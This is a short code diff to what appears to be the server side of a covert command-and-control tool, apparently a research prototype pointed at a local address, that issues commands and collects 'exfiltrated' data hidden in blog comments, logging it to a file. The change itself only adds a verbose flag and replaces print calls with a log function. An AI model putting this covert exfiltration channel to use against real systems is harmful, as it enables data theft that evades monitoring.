@@ -8,6 +8,7 @@ import threading
 
 server_id = sys.argv[1]
 random.seed(int(datetime.datetime.now().timestamp()) + int(server_id))
+is_debug = True if len(sys.argv) > 2 and sys.argv[2] == "-v" else False
 
 channel = Channel()
 channel.target_blog = "http://127.0.0.3/"
@@ -36,7 +37,7 @@ for i in range(1, 4):
     client = Client()
     client.id = str(i)
     clients.append(client)
-    print("## Created client with id: " + str(client.id))
+    log_print("## Created client with id: " + str(client.id), 2)
 
 def thread_start_listener():
     if btm_recv_config.prev_unapproved_index == 0:
@@ -49,15 +50,15 @@ def thread_start_listener():
         for exfil_content in received_data:
             to_write = str(datetime.datetime.utcnow()) + ": "
             to_write += "Extracted data with timeslot of " + str(btm_recv_config.recv_time_slot) + ": " + exfil_content + "\n"
-            print("[INFO] thread_start_listener: " + to_write);
+            log_print("[INFO] thread_start_listener: " + to_write, 2);
             f = open("../output/exfiltrated.txt", "a")
             f.write(to_write)
             f.close()
 
             message_id = exfil_content.split(":")[0]
-            print("[INFO " + str(datetime.datetime.utcnow()) + "] thread_start_listener: Extracted message_id is " + message_id + ". Sending acknowledgement...")
+            log_print("[INFO " + str(datetime.datetime.utcnow()) + "] thread_start_listener: Extracted message_id is " + message_id + ". Sending acknowledgement...", 1)
             response = submit_comment(channel.target_blog, channel.ack_channel_id, message_id)
-            print("## " + str(response.html_response_code) + ", " + response.html_response)
+            log_print("## " + str(response.html_response_code) + ", " + response.html_response, 2)
 
         btm_recv_config.prev_unapproved_index = get_current_unapproved_index(channel)            
         loop_counter -= 1
@@ -70,7 +71,7 @@ class ServerShell(cmd.Cmd):
     prompt = ">> "
 
     def do_info(self, args):
-        print("[INFO] Sending info command...")
+        log_print("[INFO] Sending info command...", 1)
         message = Message()
         message.message_id = generate_random_string(10)
         message.message = message.message_id + ": Info"
